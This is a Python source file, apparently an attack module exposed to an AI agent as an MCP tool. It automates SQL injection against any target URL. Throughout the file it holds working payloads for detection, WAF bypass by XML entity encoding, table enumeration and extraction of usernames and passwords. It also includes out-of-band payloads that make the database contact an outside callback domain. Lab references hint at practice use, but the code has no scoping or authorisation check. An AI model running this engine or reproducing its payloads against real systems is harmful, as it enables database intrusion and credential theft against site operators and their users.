"""
Hunter v5 — Auto SQLi Engine (Enhanced)

Automates the entire SQL injection workflow:
1. Column detection (ORDER BY)
2. DB version extraction (UNION SELECT)
3. Table enumeration
4. Credential extraction
5. WAF detection + bypass
6. Blind SQLi (time-based)
7. Error-based detection
8. UNION-based with auto column detection
9. Stacked queries
"""

import re
import time
from typing import Optional

try:
    from tools.probe import _get_session
except (ImportError, ModuleNotFoundError):
    import requests
    def _get_session():
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        return s


class AutoSQLi:
    """Automated SQL injection engine."""

    def __init__(self, base_url: str, param: str = "category",
                 method: str = "GET", session=None, headers: dict = None,
                 cookie_param: str = "", csrf_url: str = ""):
        self.base_url = base_url
        self.param = param
        self.method = method.upper()
        self.session = session or _get_session()
        self.extra_headers = headers or {}
        self.cookie_param = cookie_param  # e.g., "TrackingId" for cookie injection
        self.csrf_url = csrf_url  # URL to GET for CSRF token extraction
        self.csrf_token = ""
        self.db_type = None
        self.version = None
        self.columns = 0
        self.tables = []
        self.credentials = []
        self.waf_detected = False
        self.waf_name = ""
        self.payloads_used = []
        self.sqli_type = None  # union, blind, error, stacked, oob
        self.oob_domain = ""  # Burp Collaborator domain
        self.baseline_response = None
        self.evidence = None

    def _request_record(self, payload: str) -> dict:
        if self.method == "GET":
            from urllib.parse import quote
            return {"method": "GET", "url": f"{self.base_url}?{self.param}={quote(payload)}", "headers": dict(getattr(self, "extra_headers", {})), "body": ""}
        return {"method": self.method, "url": self.base_url, "headers": dict(getattr(self, "extra_headers", {})), "body": {self.param: payload}}

    def _build_evidence(self, payload: str, response: dict, reproduction_count: int) -> dict:
        baseline = self.baseline_response or {}
        metadata = {
            "response_time": response.get("time", 0),
            "baseline_response_time": baseline.get("time", 0),
        }
        return {
            "request": self._request_record(payload),
            "response": {"status_code": response.get("status", 0), "headers": response.get("headers", {}), "body": response.get("body", "")},
            "baseline_response": {"status_code": baseline.get("status", 0), "headers": baseline.get("headers", {}), "body": baseline.get("body", "")},
            "payload": payload,
            "reproduction_count": reproduction_count,
            "metadata": metadata,
        }

    def _ensure_baseline(self) -> dict:
        if self.baseline_response is None:
            self.baseline_response = self._test_payload("1")
        return self.baseline_response

    def _confirm_evidence(self, payload: str, first_response: dict) -> dict:
        from core.evidence.verdict_engine import Verdict, VerdictEngine, VulnType

        responses = [first_response]
        responses.extend(self._test_payload(payload) for _ in range(2))
        confirmed = 0
        for response in responses:
            item = self._build_evidence(payload, response, 1)
            if VerdictEngine().assess(VulnType.SQLI, item).verdict in {Verdict.LIKELY, Verdict.VERIFIED}:
                confirmed += 1
        evidence = self._build_evidence(payload, first_response, confirmed)
        self.evidence = evidence
        return evidence

    def _test_payload(self, payload: str, timeout: int = 10) -> dict:
        """Send a payload and return response analysis.

        Supports:
        - URL parameter injection (default)
        - Cookie injection (if cookie_param is set)
        - CSRF token auto-extraction (if csrf_url is set)
        """
        import time as _time
        try:
            headers = dict(self.extra_headers)

            # Auto-extract CSRF token if needed
            if self.csrf_url and not self.csrf_token:
                self._extract_csrf()

            # Cookie injection mode
            if self.cookie_param:
                existing_cookie = headers.get("Cookie", "")
                if existing_cookie:
                    headers["Cookie"] = f"{existing_cookie}; {self.cookie_param}={payload}"
                else:
                    headers["Cookie"] = f"{self.cookie_param}={payload}"

            start = _time.time()
            if self.method == "GET":
                from urllib.parse import quote
                url = f"{self.base_url}?{self.param}={quote(payload)}"
                resp = self.session.get(url, headers=headers,
                                        timeout=timeout, allow_redirects=False)
            else:
                resp = self.session.post(self.base_url, data={self.param: payload},
                                         headers=headers,
                                         timeout=timeout, allow_redirects=False)
            elapsed = _time.time() - start

            return {
                "status": resp.status_code,
                "body": resp.text,
                "length": len(resp.text),
                "time": elapsed,
                "is_error": resp.status_code >= 400 or "Internal Server Error" in resp.text,
                "has_data": any(x in resp.text.lower() for x in ["product", "item", "user", "admin", "password"]),
            }
        except Exception as e:
            return {"status": 0, "error": str(e), "is_error": True, "time": 0}

    def _extract_csrf(self):
        """Extract CSRF token from login/form page."""
        try:
            resp = self.session.get(self.csrf_url, timeout=10)
            import re
            match = re.search(r'name="csrf"[^>]*value="([^"]+)"', resp.text)
            if match:
                self.csrf_token = match.group(1)
        except Exception:
            pass

    def detect_columns(self) -> int:
        """Detect number of columns using ORDER BY."""
        for n in range(1, 15):
            result = self._test_payload(f"' ORDER BY {n}--")
            if result.get("is_error"):
                self.columns = n - 1
                return n - 1

        # Try UNION SELECT NULL method as fallback
        for n in range(1, 15):
            nulls = ",".join(["NULL"] * n)
            result = self._test_payload(f"' UNION SELECT {nulls}--")
            if not result.get("is_error") and result.get("status") == 200:
                self.columns = n
                return n

        self.columns = 1
        return 1

    def detect_db_type(self) -> str:
        """Detect database type from error messages."""
        test_payloads = [
            ("mysql", "' AND 1=CONVERT(int,@@version)--"),
            ("postgresql", "' AND 1=CAST(version() AS int)--"),
            ("mssql", "' AND 1=CONVERT(int,@@version)--"),
            ("oracle", "' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--"),
            ("sqlite", "' AND 1=CAST(sqlite_version() AS int)--"),
        ]

        for db_type, payload in test_payloads:
            result = self._test_payload(payload)
            body_lower = result.get("body", "").lower()
            if "mysql" in body_lower:
                self.db_type = "mysql"
                return "mysql"
            elif "postgresql" in body_lower or "postgres" in body_lower:
                self.db_type = "postgresql"
                return "postgresql"
            elif "microsoft" in body_lower or "sql server" in body_lower:
                self.db_type = "mssql"
                return "mssql"
            elif "oracle" in body_lower:
                self.db_type = "oracle"
                return "oracle"
            elif "sqlite" in body_lower:
                self.db_type = "sqlite"
                return "sqlite"

        self.db_type = "mysql"
        return "mysql"

    def test_boolean_blind(self) -> dict:
        """Test boolean-based blind SQLi."""
        # True condition
        true_result = self._test_payload("' AND 1=1--")
        # False condition
        false_result = self._test_payload("' AND 1=2--")

        # Check if responses differ
        true_len = true_result.get("length", 0)
        false_len = false_result.get("length", 0)

        if abs(true_len - false_len) > 50:
            self.sqli_type = "boolean_blind"
            return {
                "vulnerable": True,
                "technique": "boolean_blind",
                "true_length": true_len,
                "false_length": false_len,
                "difference": abs(true_len - false_len),
            }

        # Check status code difference
        if true_result.get("status") != false_result.get("status"):
            self.sqli_type = "boolean_blind"
            return {
                "vulnerable": True,
                "technique": "boolean_blind",
                "true_status": true_result.get("status"),
                "false_status": false_result.get("status"),
            }

        return {"vulnerable": False, "technique": "boolean_blind"}

    def test_time_blind(self) -> dict:
        """Test time-based blind SQLi."""
        # Get baseline timing
        baseline = self._test_payload("' AND 1=1--")
        base_time = baseline.get("time", 0)

        time_payloads = {
            "mysql": "' AND SLEEP(5)--",
            "postgresql": "'; SELECT pg_sleep(5)--",
            "mssql": "'; WAITFOR DELAY '0:0:5'--",
            "oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "sqlite": "' AND 1=randomblob(500000000)--",
        }

        # Try all DB types
        for db, payload in time_payloads.items():
            result = self._test_payload(payload, timeout=15)
            elapsed = result.get("time", 0)

            if elapsed > 4.0:
                self.sqli_type = "time_blind"
                self.db_type = db
                return {
                    "vulnerable": True,
                    "technique": "time_blind",
                    "db_type": db,
                    "elapsed": elapsed,
                    "baseline": base_time,
                    "payload": payload,
                }

        return {"vulnerable": False, "technique": "time_blind"}

    def test_error_based(self) -> dict:
        """Test error-based SQLi for information extraction."""
        error_payloads = [
            ("extractvalue_mysql", "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--"),
            ("updatexml_mysql", "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--"),
            ("exp_mysql", "' AND exp(~(SELECT * FROM (SELECT version())a))--"),
            ("convert_mssql", "' AND CONVERT(int,(SELECT @@version))--"),
            ("cast_postgres", "' AND CAST((SELECT version()) AS int)--"),
            ("to_number_oracle", "' AND to_number((SELECT banner FROM v$version WHERE ROWNUM=1))--"),
        ]

        version_pattern = re.compile(r'(\d+\.\d+[\.\d]*[-\w.]*)')

        for name, payload in error_payloads:
            result = self._test_payload(payload)
            body = result.get("body", "")

            # Check for version in error message
            version_match = version_pattern.search(body)
            if version_match:
                self.sqli_type = "error_based"
                self.version = version_match.group(1)
                db = name.split("_")[1] if "_" in name else "unknown"
                self.db_type = db if db != "unknown" else self.db_type
                return {
                    "vulnerable": True,
                    "technique": "error_based",
                    "db_type": db,
                    "version": self.version,
                    "payload": payload,
                }

            # Check for generic SQL errors
            sql_errors = ["sql syntax", "mysql", "postgresql", "ora-", "sqlite",
                         "microsoft sql", "unclosed quotation", "unterminated"]
            if any(err in body.lower() for err in sql_errors):
                self.sqli_type = "error_based"
                return {
                    "vulnerable": True,
                    "technique": "error_based",
                    "detail": "SQL error detected",
                    "payload": payload,
                    "error_preview": body[:200],
                }

        return {"vulnerable": False, "technique": "error_based"}

    def test_stacked_queries(self) -> dict:
        """Test stacked query injection."""
        stacked_payloads = [
            ("mysql", "'; SELECT SLEEP(5)--"),
            ("postgresql", "'; SELECT pg_sleep(5);--"),
            ("mssql", "'; WAITFOR DELAY '0:0:5';--"),
        ]

        for db, payload in stacked_payloads:
            result = self._test_payload(payload, timeout=15)
            if result.get("time", 0) > 4.0:
                self.sqli_type = "stacked"
                self.db_type = db
                return {
                    "vulnerable": True,
                    "technique": "stacked",
                    "db_type": db,
                    "elapsed": result.get("time", 0),
                }

        return {"vulnerable": False, "technique": "stacked"}

    def extract_version(self) -> str:
        """Extract database version using UNION SELECT."""
        if self.columns < 2:
            self.detect_columns()

        nulls = ["NULL"] * self.columns
        for i in range(self.columns):
            version_expr = "version()" if self.db_type != "mssql" else "@@version"
            cols = list(nulls)
            cols[i] = version_expr
            payload = f"' UNION SELECT {','.join(cols)}--"
            result = self._test_payload(payload)

            version_match = re.search(r'(\d+\.\d+[\.\d]*[-\w.]*)', result.get("body", ""))
            if version_match:
                self.version = version_match.group(1)
                return self.version

        return ""

    def extract_tables(self, limit: int = 20) -> list:
        """Extract table names from information_schema."""
        if self.columns < 2:
            self.detect_columns()

        nulls = ["NULL"] * self.columns
        queries = {
            "mysql": "group_concat(table_name SEPARATOR ',')",
            "postgresql": "string_agg(tablename, ',')",
            "mssql": "STRING_AGG(name, ',')",
            "sqlite": "group_concat(name, ',')",
        }

        query = queries.get(self.db_type, queries["mysql"])
        cols = list(nulls)
        cols[0] = f"(SELECT {query} FROM information_schema.tables WHERE table_schema=database())"
        payload = f"' UNION SELECT {','.join(cols)}--"
        result = self._test_payload(payload)

        for line in result.get("body", "").split(","):
            table = line.strip().strip("'\"")
            if table and len(table) < 50 and not table.startswith("<"):
                self.tables.append(table)

        return self.tables[:limit]

    def extract_credentials(self, table: str = "users",
                           user_col: str = "username",
                           pass_col: str = "password",
                           limit: int = 10) -> list:
        """Extract credentials from a table."""
        if self.columns < 2:
            self.detect_columns()

        nulls = ["NULL"] * self.columns
        cols = list(nulls)
        cols[0] = user_col
        cols[1] = pass_col
        payload = f"' UNION SELECT {','.join(cols)} FROM {table} LIMIT {limit}--"
        result = self._test_payload(payload)

        body = result.get("body", "")
        matches = re.findall(r'([a-zA-Z0-9_@.]+)\s*[:\s]\s*([^\s<]{3,})', body)
        for user, pwd in matches:
            if user not in ("NULL", "username", "password", "admin", "root"):
                self.credentials.append({"username": user, "password": pwd})

        return self.credentials

    def detect_waf(self) -> dict:
        """Detect if target has WAF protection."""
        result = self._test_payload("' UNION SELECT 1,2,3--")

        waf_indicators = {
            "Cloudflare": ["cloudflare", "cf-ray"],
            "ModSecurity": ["mod_security", "noyb"],
            "AWS WAF": ["aws", "x-amzn-requestid"],
            "Akamai": ["akamai", "x-akamai"],
            "Imperva": ["imperva", "incapsula"],
            "宝塔": ["bt_waf", "宝塔"],
            "安全狗": ["waf/2.0", "安全狗"],
            "长亭雷池": ["chaitin", "safe_line"],
        }

        body_lower = result.get("body", "").lower()
        headers = str(result.get("headers", "")).lower()

        for waf_name, indicators in waf_indicators.items():
            for indicator in indicators:
                if indicator in body_lower or indicator in headers:
                    self.waf_detected = True
                    self.waf_name = waf_name
                    return {"detected": True, "name": waf_name}

        if result.get("status") in (403, 406, 429):
            self.waf_detected = True
            return {"detected": True, "name": "Unknown"}

        return {"detected": False}

    def test_conditional_response(self, marker: str = "Welcome") -> dict:
        """Test conditional response SQLi (check for string presence/absence).

        Args:
            marker: String to look for in response (e.g., "Welcome back")
        """
        # True condition
        true_result = self._test_payload("' AND 1=1--")
        has_marker_true = marker.lower() in true_result.get("body", "").lower()

        # False condition
        false_result = self._test_payload("' AND 1=2--")
        has_marker_false = marker.lower() in false_result.get("body", "").lower()

        if has_marker_true != has_marker_false:
            self.sqli_type = "conditional_response"
            return {
                "vulnerable": True,
                "technique": "conditional_response",
                "marker": marker,
                "true_has_marker": has_marker_true,
                "false_has_marker": has_marker_false,
            }

        return {"vulnerable": False, "technique": "conditional_response"}

    def test_oob(self, collaborator_domain: str = "") -> dict:
        """Test Out-of-Band SQLi using DNS/HTTP callback.

        Args:
            collaborator_domain: Burp Collaborator domain for OOB testing
        """
        if not collaborator_domain:
            collaborator_domain = self.oob_domain

        if not collaborator_domain:
            return {"vulnerable": False, "technique": "oob", "error": "No collaborator domain provided"}

        oob_payloads = {
            "oracle_utl_inaddr": f"' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{collaborator_domain}') FROM dual--",
            "oracle_utl_http": f"' UNION SELECT UTL_HTTP.REQUEST('http://{collaborator_domain}/') FROM dual--",
            "mssql_xp_dirtree": f"'; EXEC master..xp_dirtree '\\\\{collaborator_domain}\\a'--",
            "postgresql_copy": f"'; COPY (SELECT '') TO PROGRAM('nslookup {collaborator_domain}')--",
            "mysql_load_file": f"' AND LOAD_FILE('\\\\\\\\{collaborator_domain}\\\\a')--",
        }

        for db, payload in oob_payloads.items():
            result = self._test_payload(payload)
            if result.get("status") == 200:
                return {
                    "vulnerable": True,
                    "technique": "oob",
                    "db_type": db.split("_")[0],
                    "payload": payload,
                    "note": "Check Collaborator for callbacks to confirm",
                }

        return {"vulnerable": False, "technique": "oob"}

    def run_full_scan(self) -> dict:
        """Run complete automated SQLi scan."""
        start = time.time()
        results = {
            "target": self.base_url,
            "param": self.param,
            "steps": [],
        }
        self._ensure_baseline()
        bool_result = {"vulnerable": False}
        time_result = {"vulnerable": False}
        stacked_result = {"vulnerable": False}

        # Step 1: WAF Detection
        waf = self.detect_waf()
        results["waf"] = waf
        results["steps"].append({"step": "waf_detection", "result": waf})

        # Step 2: Error-based detection
        error_result = self.test_error_based()
        results["error_based"] = error_result
        results["steps"].append({"step": "error_based", "result": error_result})

        # Step 3: Boolean-based blind
        if not self.sqli_type:
            bool_result = self.test_boolean_blind()
            results["boolean_blind"] = bool_result
            results["steps"].append({"step": "boolean_blind", "result": bool_result})

        # Step 4: Time-based blind
        if not self.sqli_type:
            time_result = self.test_time_blind()
            results["time_blind"] = time_result
            results["steps"].append({"step": "time_blind", "result": time_result})

        # Step 5: Stacked queries
        if not self.sqli_type:
            stacked_result = self.test_stacked_queries()
            results["stacked"] = stacked_result
            results["steps"].append({"step": "stacked", "result": stacked_result})

        # Step 6: Column Detection (for UNION-based)
        cols = self.detect_columns()
        results["columns"] = cols
        results["steps"].append({"step": "column_detection", "result": cols})

        # Step 7: DB Type Detection
        db = self.detect_db_type()
        results["db_type"] = db
        results["steps"].append({"step": "db_detection", "result": db})

        # Step 8: Version Extraction
        version = self.extract_version()
        results["version"] = version
        results["steps"].append({"step": "version_extraction", "result": version})

        # Step 9: Table Enumeration
        tables = self.extract_tables()
        results["tables"] = tables
        results["steps"].append({"step": "table_enumeration", "result": tables})

        # Step 10: Credential Extraction
        user_tables = [t for t in tables if any(x in t.lower() for x in ["user", "admin", "account", "member"])]
        if user_tables:
            creds = self.extract_credentials(table=user_tables[0])
            results["credentials"] = creds
            results["steps"].append({"step": "credential_extraction", "result": creds})

        candidate = None
        if error_result.get("vulnerable") and error_result.get("payload"):
            candidate = error_result["payload"]
        elif time_result.get("vulnerable") and time_result.get("payload"):
            candidate = time_result["payload"]
        if candidate:
            first_response = self._test_payload(candidate, timeout=15)
            results["evidence"] = self._confirm_evidence(candidate, first_response)

        results["vulnerable"] = self.sqli_type is not None or bool_result.get("vulnerable") or time_result.get("vulnerable")
        results["sqli_type"] = self.sqli_type
        results["elapsed_ms"] = int((time.time() - start) * 1000)
        results["total_findings"] = len(results.get("credentials", []))

        return results


# ---------------------------------------------------------------------------
# XML Encoding Bypass (Lab #56: WAF blocks raw SQL but XML parser decodes entities)
# ---------------------------------------------------------------------------

def xml_encode_payload(payload: str) -> str:
    """Encode SQL payload as XML numeric character references.

    Lab #56: WAF blocks raw SQL keywords (UNION, SELECT, etc.) but the
    back-end XML parser decodes numeric character references before passing
    the value to the SQL query.

    Example:
        '1 UNION SELECT' ->
        '&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;'
    """
    return ''.join(f'&#{ord(c)};' for c in payload)


def xml_encode_payload_hex(payload: str) -> str:
    """Encode SQL payload as XML hex character references.

    Some parsers only decode hex entities.  Provides a second encoding
    option when decimal entities are filtered.
    """
    return ''.join(f'&#x{ord(c):x};' for c in payload)


def build_xml_sqli_body(value: str, tag: str = "productId",
                        root: str = "stockCheck") -> str:
    """Wrap a (possibly XML-encoded) value inside a minimal XML body.

    Typical stock-check POST body:
        <stockCheck><productId>1</productId></stockCheck>
    """
    encoded = xml_encode_payload(value)
    return f"<{root}><{tag}>{encoded}</{tag}></{root}>"


def test_xml_sqli(url: str, param: str = "productId",
                  method: str = "POST", session=None,
                  headers: dict = None) -> dict:
    """Test for SQLi in XML context with numeric-character-reference bypass.

    Workflow:
      1. Send raw SQL payload (expect WAF block / 403 / error).
      2. Send XML-encoded payload (expect bypass if vulnerable).
      3. Compare response lengths / status codes.

    Returns dict with keys: vulnerable, raw_status, encoded_status,
    raw_length, encoded_length, technique.
    """
    import requests as _req
    s = session or _req.Session()
    h = {"Content-Type": "application/xml", **(headers or {})}

    raw_payload = "1 UNION SELECT username, password FROM users--"
    encoded_payload = xml_encode_payload(raw_payload)

    raw_body = build_xml_sqli_body(raw_payload, tag=param)
    enc_body = build_xml_sqli_body(encoded_payload, tag=param)

    try:
        raw_resp = s.request(method, url, data=raw_body, headers=h,
                             timeout=10, verify=False, allow_redirects=False)
        enc_resp = s.request(method, url, data=enc_body, headers=h,
                             timeout=10, verify=False, allow_redirects=False)

        raw_blocked = raw_resp.status_code in (403, 406, 429) or \
                      len(raw_resp.text) < 10
        enc_has_data = any(kw in enc_resp.text.lower()
                          for kw in ["administrator", "password", "carlos", "admin"])

        vulnerable = raw_blocked and enc_has_data and enc_resp.status_code == 200

        return {
            "vulnerable": vulnerable,
            "technique": "xml_entity_bypass",
            "raw_status": raw_resp.status_code,
            "raw_length": len(raw_resp.text),
            "encoded_status": enc_resp.status_code,
            "encoded_length": len(enc_resp.text),
            "encoded_preview": enc_resp.text[:300],
            "encoded_payload": encoded_payload,
        }
    except Exception as e:
        return {"vulnerable": False, "technique": "xml_entity_bypass",
                "error": str(e)}


# ---------------------------------------------------------------------------
# Oracle DB Support
# ---------------------------------------------------------------------------

def get_oracle_payloads() -> dict:
    """Oracle-specific SQLi payloads and syntax helpers.

    Oracle quirks handled:
      - Requires ``FROM dual`` for standalone SELECTs.
      - Uses ``||`` for string concatenation (not ``+``).
      - Uses ``--`` for line comments (no ``#``).
      - ``ROWNUM`` replaces ``LIMIT``.
      - ``v$version`` for version info.
      - ``all_tables`` / ``all_tab_columns`` for schema enumeration.
    """
    return {
        "comment": "--",
        "string_concat": "||",
        "error_trigger": "TO_CHAR(1/0)",
        "time_delay": "DBMS_PIPE.RECEIVE_MESSAGE('a',10)",
        "version": "SELECT banner FROM v$version WHERE ROWNUM=1",
        "tables": "SELECT table_name FROM all_tables WHERE ROWNUM<=10",
        "columns": (
            "SELECT column_name FROM all_tab_columns "
            "WHERE table_name='{table}' AND ROWNUM<=10"
        ),
        "extract": "SELECT {column} FROM {table} WHERE ROWNUM=1",
        "dual_required": True,
        "string_quote": "'",          # Oracle has no backtick
        "error_keywords": ["ora-", "oracle", "quoted string not properly terminated"],
    }


def build_oracle_extract(column: str, table: str,
                         username: str = "administrator") -> str:
    """Build Oracle UNION extraction payload with ``FROM dual``.

    Returns a subselect suitable for embedding in a UNION or boolean-based
    payload.  Oracle requires ``FROM dual`` when the query has no natural
    ``FROM`` clause.

    Example output::

        (SELECT username FROM users WHERE username='administrator')
    """
    # Use a subselect that Oracle can evaluate inside UNION position
    return f"(SELECT {column} FROM {table} WHERE username='{username}')"


def build_oracle_version_payload(columns: int = 2,
                                 vuln_col: int = 0) -> str:
    """Build a UNION payload to extract Oracle version via v$version."""
    cols = ["NULL"] * columns
    cols[vuln_col] = "(SELECT banner FROM v$version WHERE ROWNUM=1)"
    return f"' UNION SELECT {','.join(cols)} FROM dual--"


def build_oracle_table_enum_payload(columns: int = 2,
                                    vuln_col: int = 0) -> str:
    """Build a UNION payload to enumerate Oracle tables (XMLAgg trick)."""
    # XMLAgg concatenates multiple rows into one XML string
    cols = ["NULL"] * columns
    cols[vuln_col] = (
        "(SELECT XMLAgg(XMLELEMENT(e, table_name||',') ORDER BY table_name)"
        ".getStringVal() FROM (SELECT table_name FROM all_tables WHERE ROWNUM<=50))"
    )
    return f"' UNION SELECT {','.join(cols)} FROM dual--"


def build_oracle_credential_payload(table: str, user_col: str = "username",
                                    pass_col: str = "password",
                                    columns: int = 2) -> str:
    """Build a UNION payload to extract credentials from an Oracle table."""
    cols = ["NULL"] * columns
    if columns >= 2:
        cols[0] = user_col
        cols[1] = pass_col
    else:
        cols[0] = f"{user_col}||':'||{pass_col}"
    return f"' UNION SELECT {','.join(cols)} FROM {table} WHERE ROWNUM<=10--"


def oracle_time_delay(seconds: int = 5) -> str:
    """Return Oracle time-based blind payload."""
    return f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds})--"


def oracle_error_extract(query: str) -> str:
    """Wrap a subquery in Oracle's TO_CHAR(1/0) to trigger an error leak."""
    return f"' AND TO_CHAR(1/0)=({query})--"


def auto_sqli_impl(base_url: str, param: str = "category",
                   method: str = "GET", headers: dict = None) -> dict:
    """Run automated SQLi scan. Entry point for MCP tool."""
    engine = AutoSQLi(base_url, param, method, headers=headers)
    return engine.run_full_scan()
